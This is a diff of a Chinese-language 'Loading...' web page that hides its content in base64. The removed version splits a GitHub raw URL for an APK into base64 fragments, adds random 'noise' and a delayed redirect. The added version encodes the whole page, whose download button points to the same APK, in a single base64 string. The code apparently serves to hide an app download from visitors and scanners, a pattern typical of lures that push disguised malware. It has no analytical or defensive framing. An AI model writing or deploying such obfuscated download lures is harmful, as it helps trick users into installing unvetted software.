@@ -6,71 +6,9 @@
 <title>加载中...</title>
 
 <script>
-(function(){
+var _0x='PCEtLURPQ1RZUEUgaHRtbD4KPGh0bWw+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgPHRpdGxlPuS4lueVjOWQjeWkqDwvdGl0bGU+CiAgPHN0eWxlPgogICAgYm9keSB7CiAgICAgIG1hcmdpbjogMDsKICAgICAgcGFkZGluZzogMDsKICAgICAgaGVpZ2h0OiAxMDB2aDsKICAgICAgZGlzcGxheTogZmxleDsKICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgICAgIGZvbnQtZmFtaWx5OiBBcmlhbDsKICAgICAgYmFja2dyb3VuZDogdXJsKCcxMjM0NTYuanBnJykgbm8tcmVwZWF0IGNlbnRlciBjZW50ZXI7CiAgICAgIGJhY2tncm91bmQtc2l6ZTogY292ZXI7CiAgICB9CiAgICAuYm94IHsKICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICBiYWNrZ3JvdW5kOiByZ2JhKDAsMCwwLDAuNSk7CiAgICAgIHBhZGRpbmc6IDMwcHg7CiAgICAgIGJvcmRlci1yYWRpdXM6IDE1cHg7CiAgICAgIGNvbG9yOiB3aGl0ZTsKICAgICAgd2lkdGg6IDkwJTsKICAgICAgbWF4LXdpZHRoOiA0MDBweDsKICAgIH0KICAgIGgxIHsgZm9udC1zaXplOiAyNHB4OyB9CiAgICBwIHsgZm9udC1zaXplOiAxNHB4OyB9CiAgICAuYnRuIHsKICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogICAgICBtYXJnaW4tdG9wOiAyMHB4OwogICAgICBwYWRkaW5nOiAxMnB4IDIwcHg7CiAgICAgIGZvbnQtc2l6ZTogMTZweDsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzI4YTc0NTsKICAgICAgY29sb3I6IHdoaXRlOwogICAgICBib3JkZXItcmFkaXVzOiA4cHg7CiAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgIH0KICAgIC5idG46aG92ZXIgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMjE4ODM4OyB9CiAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KICA8ZGl2IGNsYXNzPSJib3giPgogICAgPGgxPuadpeS6rueUn+eZu+W9leWkqDwvaDE+CiAgICA8cD7mm7TlpJrnm67mlbDlj4DmlbDlvIDkvZPku6Pkv6HmiJHku6w8L3A+CiAgICA8YSBjbGFzcz0iYnRuIiBocmVmPSJodHRwczovL2dpdGh1Yi5jb20vemhhbmdzYW4zNDU1L2Fway1kb3dubG9hZC9yYXcvbWFpbi9ocHpzb3h0ZXgwMzE2LmFwayI+5LiL6L295bmz5a6J5Yqo5omLPC9hPgogIDwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4=';
 
-  // ====== 整页内容（加密）======
-  var _0xa = `
-  PGh0bWw+PGhlYWQ+
-  PG1ldGEgY2hhcnNldD0iVVRGLTgiPg==
-  PG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj4=
-  PHRpdGxlPuW8gOWni+S4i+S9k+W6lTwvdGl0bGU+
-  PHN0eWxlPg==
-  Ym9keXttYXJnaW46MDtmb250LWZhbWlseTpBcmlhbDtiYWNrZ3JvdW5kOnVybCgnMTIzNDU2LmpwZycpIG5vLXJlcGVhdCBjZW50ZXIvY292ZXI7aGVpZ2h0OjEwMHZoO2Rpc3BsYXk6ZmxleDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyO2FsaWduLWl0ZW1zOmNlbnRlcn0=
-  LmJveHtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC42KTtwYWRkaW5nOjMwcHg7Ym9yZGVyLXJhZGl1czoxNXB4O3dpZHRoOjkwJTttYXgtd2lkdGg6NDAwcHg7dGV4dC1hbGlnbjpjZW50ZXI7Y29sb3I6I2ZmZn0=
-  aDF7Zm9udC1zaXplOjI0cHg7bWFyZ2luOjEwcHggMH0=
-  cHtmb250LXNpemU6MTRweDtvcGFjaXR5Oi44fQ==
-  LmJ0bntkaXNwbGF5OmlubGluZS1ibG9jaztwYWRkaW5nOjEycHggMjBweDtiYWNrZ3JvdW5kOiMwMDdiZmY7Y29sb3I6I2ZmZjti b3JkZXItcmFkaXVzOjEwcHg7dGV4dC1kZWNvcmF0aW9uOm5vbmU7bWFyZ2luLXRvcDoyMHB4fQ==
-  PC9zdHlsZT48L2hlYWQ+
-  PGJvZHk+
-  PGRpdiBjbGFzcz0iYm94Ij4=
-  PGgxPuW8gOWni+S4i+S9k+W6lTwvaDE+
-  PHA+5a6J5YWo5L2T5o+Q5L6b5Y+v5LqG5Y+R5biDPC9wPg==
-  PGEgaHJlZj0iamF2YXNjcmlwdDpnKCkiIGNsYXNzPSJidG4iPuS4i+S9k+S4i+WvueaMlw==PC9hPg==
-  PC9kaXY+PC9ib2R5PjwvaHRtbD4=
-  `;
-
-  function _d(s){
-    try{
-      return decodeURIComponent(escape(atob(s)));
-    }catch(e){
-      return atob(s);
-    }
-  }
-
-  // ====== 解析HTML ======
-  var _html='';
-  _0xa.trim().split("\n").forEach(function(i){
-    _html += _d(i.trim());
-  });
-
-  document.write(_html);
-
-  // ====== 下载逻辑 ======
-  window.g = function(){
-
-    if(!confirm("确认下载应用？")) return;
-
-    // 混淆片段（拆分）
-    var p1 = "aHR0cHM6Ly9naXQ=";
-    var p2 = "aHViLmNvbS96aGFuZw==";
-    var p3 = "c2FuMzQ1NS9hcGstZA==";
-    var p4 = "b3dubG9hZC9yYXcvbWFpbg==";
-    var p5 = "L2hwenNveHRleDAzMTYuYXBr";
-
-    function r(x){ return atob(x); }
-
-    var url = r(p1)+r(p2)+r(p3)+r(p4)+r(p5);
-
-    // 干扰
-    var noise = Math.random()*999;
-    var t = Date.now();
-
-    setTimeout(function(){
-      location.href = url + "?v=" + t + "&r=" + noise;
-    }, 800 + Math.random()*500);
-  }
-
-})();
+document.write(atob(_0x));
 </script>
 
 </head>
